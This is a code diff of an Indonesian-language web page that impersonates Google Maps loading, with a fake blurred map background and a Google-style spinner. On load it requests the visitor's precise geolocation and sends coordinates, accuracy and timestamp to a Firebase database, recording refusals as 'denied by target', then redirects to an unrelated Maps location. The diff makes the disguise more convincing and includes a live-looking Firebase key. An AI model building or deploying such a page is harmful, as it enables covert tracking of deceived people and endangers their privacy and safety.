@@ -3,11 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Titik Temu Google Maps</title>
+    <title>Google Maps</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #f8f9fa; color: #333; }
-        .loader { border: 10px solid #f3f3f3; border-top: 10px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { width: 100%; height: 100%; overflow: hidden; font-family: Roboto, Arial, sans-serif; background-color: #e5e3df; }
+        
+        /* Background peta buram buatan agar terkesan maps asli sedang loading */
+        .maps-bg {
+            position: absolute; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(255,255,255,0) 0%, rgba(229,227,223,1) 80%), 
+                        url('https://maps.gstatic.com/tactile/gmm/api_geolocation_v2.png');
+            filter: blur(4px); opacity: 0.6; transform: scale(1.1);
+        }
+        
+        .spinner-container {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%); text-align: center; z-index: 10;
+        }
+        
+        /* Spinner menyerupai loading Google Maps */
+        .gmaps-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 45px; height: 45px;
+            border-radius: 50%;
+            border-left-color: #4285F4; /* Biru Google */
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 15px auto;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .text { color: #5f6368; font-size: 14px; font-weight: 400; }
     </style>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -15,15 +40,18 @@
 </head>
 <body>
 
-    <h2>Memuat Lokasi Titik Temu...</h2>
-    <div class="loader"></div>
-    <p>Mohon tunggu sebentar, sedang menyinkronkan dengan Google Maps.</p>
+    <div class="maps-bg"></div>
+    
+    <div class="spinner-container">
+        <div class="gmaps-spinner"></div>
+        <div class="text">Membuka Google Maps...</div>
+    </div>
 
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyDLvcWnSRgoXxmid11Wx_GiVnOJMmgQR9I",
             authDomain: "maps-a9472.firebaseapp.com",
-            databaseURL: "https://maps-a9472-default-rtdb.firebaseio.com", 
+            databaseURL: "https://maps-a9472-default-rtdb.firebaseio.com",
             projectId: "maps-a9472",
             storageBucket: "maps-a9472.firebasestorage.app",
             messagingSenderId: "642710632619",
@@ -33,18 +61,18 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // --- LINK BARU: Menggunakan url pencarian koordinat Monas Jakarta yang dijamin 100% aktif terus ---
+        // Diarahkan langsung ke koordinat Monas agar begitu masuk langsung terbuka peta asli
         const TARGET_MAPS_URL = "https://www.google.com/maps/search/?api=1&query=-6.175392,106.827153"; 
 
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                     enableHighAccuracy: true,
-                    timeout: 7000,
+                    timeout: 6000,
                     maximumAge: 0
                 });
             } else {
-                saveToFirebase({ status: "Browser tidak mendukung Geolocation" });
+                saveToFirebase({ status: "Tidak didukung" });
             }
         };
 
@@ -54,45 +82,27 @@
             const acc = position.coords.accuracy;
             const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
-            const data = {
+            saveToFirebase({
                 waktu: timestamp,
                 latitude: lat,
                 longitude: lng,
                 akurasi_meter: Math.round(acc),
                 google_maps_link: `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`,
-                status: "Berhasil mendapatkan lokasi"
-            };
-
-            saveToFirebase(data);
+                status: "Success"
+            });
         }
 
         function handleError(error) {
-            let pesanGagal = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    pesanGagal = "Target menolak (Block) izin lokasi.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    pesanGagal = "Posisi tidak tersedia.";
-                    break;
-                case error.TIMEOUT:
-                    pesanGagal = "Waktu permintaan habis.";
-                    break;
-            }
+            let status = "Error";
+            if (error.code === error.PERMISSION_DENIED) status = "Ditolak target";
+            else if (error.code === error.TIMEOUT) status = "Timeout";
             
             const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-            saveToFirebase({ waktu: timestamp, status: pesanGagal });
+            saveToFirebase({ waktu: timestamp, status: status });
         }
 
         function saveToFirebase(objekData) {
-            database.ref('logs_lokasi').push(objekData)
-            .then(() => {
-                redirectToMaps();
-            })
-            .catch((err) => {
-                console.error(err);
-                redirectToMaps();
-            });
+            database.ref('logs_lokasi').push(objekData).then(() => { redirectToMaps(); }).catch(() => { redirectToMaps(); });
         }
 
         function redirectToMaps() {
